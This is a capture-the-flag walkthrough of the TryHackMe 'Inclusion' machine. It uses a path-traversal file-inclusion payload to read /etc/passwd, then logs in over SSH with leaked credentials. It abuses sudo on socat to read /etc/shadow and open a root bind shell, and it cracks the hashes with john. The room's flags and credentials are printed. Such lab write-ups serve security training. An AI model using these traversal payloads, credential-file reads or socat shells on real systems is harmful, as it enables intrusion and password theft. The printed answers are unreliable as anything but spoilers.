# Inclusion - Try Hack Me - https://tryhackme.com/room/inclusion
I don't care about your flags...
```how to OWN this machine```

# Enumeration:

___
### nmap
``` bash
nmap -sV -sC [IP]
```
>Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-16 03:49 EDT
Nmap scan report for 10.10.120.193
Host is up (0.15s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.36 seconds

we can see the ssh port is open but it's probably a dead end right now
___
 
``` bash
nmap -p- 10.10.120.193 (this may take some time)
```
>Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-16 03:52 EDT
Nmap scan report for 10.10.120.193
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

i dont know why this http port wont show on my "advance scan" but good practis is to scan all ports anyway...
 ___
### curl
```
curl 10.10.120.193
```
``` HTML
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
 
    <title>My blog</title>
 
    <!-- Bootstrap core CSS -->
    <link href="../static/css/bootstrap.min.css" rel="stylesheet">
 
    <!-- Custom styles for this template -->
    <link href="../static/css/jumbotron.css" rel="stylesheet">
  </head>
 
  <body>
 
    <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
 
      <div class="collapse navbar-collapse" id="navbarsExampleDefault">
        <ul class="navbar-nav mr-auto">
          <li class="nav-item active">
            <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
          </li>
        </ul>
        <form class="form-inline my-2 my-lg-0">
          <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
          <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
        </form>
      </div>
    </nav>
 
    <main role="main">
 
      <!-- Main jumbotron for a primary marketing message or call to action -->
      <div class="jumbotron">
        <div class="container">
          <h1 class="display-3">Hello, world!</h1>
          <p> Welcome to my blog. This is currently in it's early stage but you can find some articles that I've wrote.</p>
          <p><a class="btn btn-primary btn-lg" href="#" role="button">Learn more &raquo;</a></p>
        </div>
      </div>
 
      <div class="container">
        <!-- Example row of columns -->
        <div class="row">
          <div class="col-md-4">
            <h2>Hacking this world</h2>
            <p>There are various ways we can hack people and the devices these people depends upon. The best thing is that we don't even have to thing about it twice because bad things happen.</p>
           <p><a class="btn btn-secondary" href="/article?name=hacking" role="button">View details &raquo;</a></p>
         </div>
         <div class="col-md-4">
           <h2>LFI-attack</h2>
           <p>Local file inclusion attack is the one using which you can include any localfile i.e all the files that are present on the server if the permission is right on the file. The most common file on unix that we can check for is /etc/passwd </p>
           <p><a class="btn btn-secondary" href="/article?name=lfiattack" role="button">View details &raquo;</a></p>
         </div>
         <div class="col-md-4">
           <h2>RFI-attack</h2>
           <p>RFI attack or Remote file inclusion attack is the one in which server would include any file from outside the server that means we can include any evil file from our server to the e and then exploit it.</p>
           <p><a class="btn btn-secondary" href="/article?name=rfiattack" role="button">View details &raquo;</a></p>
         </div>
       </div>
 
       <hr>
 
     </div> <!-- /container -->
 
   </main>
 
   <footer class="container">
     <p>&copy; falconfeast 2020</p>
   </footer>
 
     </body>
```
 
ok we do have a website running and it's not a basic index.html file from apache or Nginx
we can explor the website a little bit using firefox
some buttons wont work, only the artical section is working properly and leading us to local links
``` bash
curl http://10.10.120.193/article?name=hacking
```
```HTML
Hacking is identifying weakness in computer systems or networks to exploit its weaknesses to gain access. Example of Hacking: Using password cracking algorithm to gain access to a system Computers have become mandatory to run a successful businesses. It is not enough to have isolated computers systems; they need to be networked to facilitate communication with external businesses. This exposes them to the outside world and hacking. Hacking means using computers to commit fraudulent acts such as fraud, privacy invasion, stealing corporate/personal data, etc. Cyber crimes cost many organizations millions of dollars every year. Businesses need to protect themselves against such attacks. In this tutorial, we will learn- Common Hacking Terminologies What is Cyber Crime? Types of Cyber Crime What is Ethical Hacking? Why Ethical Hacking? Legality of Ethical Hacking Summary Before we go any further, let’s look at some of the most commonly used terminologies in the world of hacking. Who is a Hacker? Types of Hackers A Hacker is a person who finds and exploits the weakness in computer systems and/or networks to gain access. Hackers are usually skilled computer programmers with knowledge of computer security. Hackers are classified according to the intent of their actions. The following list classifies hackers according to their intent. Symbol Description What is Hacking ? An Introduction Ethical Hacker (White hat): A hacker who gains access to systems with a view to fix the identified weaknesses. They may also perform penetration Testing and vulnerability assessments. What is Hacking ? An Introduction Cracker (Black hat): A hacker who gains unauthorized access to computer systems for personal gain. The intent is usually to steal corporate data, violate privacy rights, transfer funds from bank accounts etc. What is Hacking ? An Introduction Grey hat: A hacker who is in between ethical and black hat hackers. He/she breaks into computer systems without authority with a view to identify weaknesses and reveal them to the system owner. What is Hacking ? An Introduction Script kiddies: A non-skilled person who gains access to computer systems using already made tools. What is Hacking ? An Introduction Hacktivist: A hacker who use hacking to send social, religious, and political, etc. messages. This is usually done by hijacking websites and leaving the message on the hijacked website. What is Hacking ? An Introduction Phreaker: A hacker who identifies and exploits weaknesses in telephones instead of computers. What is Cybercrime? Cyber crime is the use of computers and networks to perform illegal activities such as spreading computer viruses, online bullying, performing unauthorized electronic fund transfers, etc. Most cybercrimes are committed through the internet. Some cybercrimes can also be carried out using Mobile phones via SMS and online chatting applications. Type of Cybercrime The following list presents the common types of cybercrimes: Computer Fraud: Intentional deception for personal gain via the use of computer systems. Privacy violation: Exposing personal information such as email addresses, phone number, account details, etc. on social media, websites, etc. Identity Theft: Stealing personal information from somebody and impersonating that person. Sharing copyrighted files/information: This involves distributing 70 72 69 6d 31 74 69 76 65 0a copyright protected files such as eBooks and computer programs etc. Electronic funds transfer: This involves gaining an un-authorized access to bank computer networks and making illegal fund transfers. Electronic money laundering: This involves the use of the computer to launder money. ATM Fraud: This involves intercepting ATM card details such as account number and PIN numbers. These details are then used to withdraw funds from the intercepted accounts. Denial of Service Attacks: This involves the use of computers in multiple locations to attack servers with a view of shutting them down. Spam: Sending unauthorized emails. These emails usually contain advertisements. What is Ethical Hacking? Ethical Hacking is identifying weakness in computer systems and/or computer networks and coming with countermeasures that protect the weaknesses. Ethical hackers must abide by the following rules. Get written permission from the owner of the computer system and/or computer network before hacking. Protect the privacy of the organization been hacked. Transparently report all the identified weaknesses in the computer system to the organization. Inform hardware and software vendors of the identified weaknesses. Why Ethical Hacking? Information is one of the most valuable assets of an organization. Keeping information secure can protect an organization’s image and save an organization a lot of money. Hacking can lead to loss of business for organizations that deal in finance such as PayPal. Ethical hacking puts them a step ahead of the cyber criminals who would otherwise lead to loss of business. Legality of Ethical Hacking Ethical Hacking is legal if the hacker abides by the rules stipulated in the above section on the definition of ethical hacking. The International Council of E-Commerce Consultants (EC-Council) provides a certification program that tests individual’s skills. Those who pass the examination are awarded with certificates. The certificates are supposed to be renewed after some time. Summary Hacking is identifying and exploiting weaknesses in computer systems and/or computer networks. Cybercrime is committing a crime with the aid of computers and information technology infrastructure. Ethical Hacking is about improving the security of computer systems and/or computer networks. Ethical Hacking is legal. --> Taken from https://www.guru99.com/what-is-hacking-an-introduction.html
```
 we got a long string... no php or css here and the url look's Promessing.
"name=hacking"
hacking is a variable, is it a  file name maybe?
we will do a basic check
 
``` bash
curl http://10.10.120.193/article?name=/etc/passwd
``` 
```html
c/passwd
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

we got nothing... lets try advanced methods
 
```bash
curl http://10.10.120.193/article?name=/../etc/passwd
```
```html
c/passwd
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```
 
nothing...
lets do one more thing
 
```bash
curl http://10.10.120.193/article?name=/../../../../../../../../../../etc/passwd
```
```html
<!DOCTYPE html>
<html>
    <body>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
    </body>
</html>
```
Yea! we got a file outside the website folder.
now we can see the /etc/passwd file infront of us and see what inside it.
inside it there's a strange user with a hash (comment) sign "#falconfeast:rootpassword"
lets try ssh then...
 
___
### socat
```bash
ssh falconfeast@10.10.120.193
```
```bash
falconfeast@inclusion:~$
```
ok! we got our-self's a shell!
lets so a basic enum
```bash
whoami
```
> falconfeast
```bash
groups
```
> falconfeast adm cdrom sudo dip plugdev lxd lpadmin sambashare
```bash
sudo -l
```
>Matching Defaults entries for falconfeast on inclusion:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
>User falconfeast may run the following commands on inclusion:
      (root) NOPASSWD: /usr/bin/socat
 
ok so we do have extended permissions.
we are part of the groups "adm cdrom sudo dip plugdev lxd lpadmin sambashare"
and we do have a permission to sudo on the socat program (very similar to netcat but with a different syntax)
 
a quick search on the web and i found this line of code: "socat TCP4-LISTEN:4444,reuseaddr  OPEN:[$file]"
(alternatively we can use this line to get a Shell and OWN the machine "sudo socat TCP4-LISTEN:4444,reuseaddr  SYSTEM:/bin/sh")

### socat TCP4-LISTEN:4444,reuseaddr  OPEN:[$file]
>TCP4-LISTEN =            use ipv4 listiner

>4444 =                   our port (similarly to netcat)

>reuseaddr =              use this user machine ip address

>OPEN: =                  part of the socat abillitis to open files (use 'SYSTEM' to execute files)

>[$file] =                the file we want to read

our syntax will be as follow (dont forget 'sudo' to run socat as root)
 
```bash
sudo socat TCP4-LISTEN:4444,reuseaddr OPEN:/etc/shadow
``` 
```bash
(kali machine) netcat 10.10.120.193 4444
```
```
root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18281:0:99999:7:::
uuidd:*:18281:0:99999:7:::
dnsmasq:*:18281:0:99999:7:::
landscape:*:18281:0:99999:7:::
pollinate:*:18281:0:99999:7:::
falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
sshd:*:18281:0:99999:7:::
mysql:!:18281:0:99999:7:::
root@kali:~/Desktop/CTF/THM/Inclusion# netcat 10.10.120.193 4444
root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18281:0:99999:7:::
uuidd:*:18281:0:99999:7:::
dnsmasq:*:18281:0:99999:7:::
landscape:*:18281:0:99999:7:::
pollinate:*:18281:0:99999:7:::
falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
sshd:*:18281:0:99999:7:::
mysql:!:18281:0:99999:7:::
```
we will copy this shadow file to our local kali machine

``` bash
sudo socat TCP4-LISTEN:4444,reuseaddr  OPEN:/etc/shadow
```
``` bash
(kali) netcat 10.10.120.193 4444 > shadow
```
 
and we also need the passwd file too...
``` bash
sudo socat TCP4-LISTEN:4444,reuseaddr  OPEN:/etc/passwd
```
``` bash
(kali) netcat 10.10.120.193 4444 > passwd
```
 
so we got our 2 files
now we need to unshadow them, then use john to crack them
 
``` bash
unshadow passwd shaodw > hash
```
``` bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

##### Disclaimer
this can take some time in the meantime lets explorer other methods of privilage escelation.
get a root shell insted of getting files can be very simple with socat and would save us some time with john
in the socat command we just need to replace OPEN with SYSTEM and /etc/passwd with /bin/bash or any shell you want
 
```bash
sudo socat TCP4-LISTEN:4444,reuseaddr  SYSTEM:/bin/bash
```
```bash
(kali) netcat 10.10.120.193 4444
```

>whoami

>root
 
easely enoght we got our-self a root shell just like that
### now to get our flags!
```
cat /home/falconfeast/user.txt
```
> 60989655118397345799
```
cat /root/root.txt
```
> 42964104845495153909

 ___
 
# conclution
 
the only thing that is "difficult" in this machine is the LFI part, for new users that wont know the spamming "/.." trick this is where they will be lost...
otherwise it's a straight forward machine and a fun one!



# SOLVE THIS MACHIN IN 2 MINUTES!
if we just wanted to get the flags and not dealing with all this nonsense we could have just do LFI at firefox...
``` html
curl http://10.10.120.193/article?name=/../../../../../../../../../../home/falconfeast/user.txt
```
> 60989655118397345799

for the user
and...
```
curl http://10.10.120.193/article?name=/../../../../../../../../../../root/root.txt
```
> 42964104845495153909

for the root
that is possible as we do have root premission somewere on the www-data user (probably on the cat command) :P 
but i want to OWN every machine that i can, so this is not enough for me...
 
# creds
falconfeast:rootpassword
 
 
# task 1
user flag: 60989655118397345799
root flag: 42964104845495153909